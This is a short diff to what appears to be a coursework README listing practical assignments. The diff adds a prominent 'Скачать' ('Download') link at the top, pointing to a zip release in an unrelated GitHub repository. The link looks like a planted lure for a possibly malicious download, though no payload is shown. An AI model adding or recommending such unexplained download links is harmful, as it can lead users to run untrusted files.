@@ -1,3 +1,7 @@
+<h1 align="center">
+  <a href="https://github.com/ttqb/AOO/releases/download/11-12-2023/AOO-master.zip">Скачать</a>
+</h1>
+
 ### ААС
 * [ПЗ_1](/ААС/ПЗ_1)
 * [ПЗ_2](/ААС/ПЗ_2)
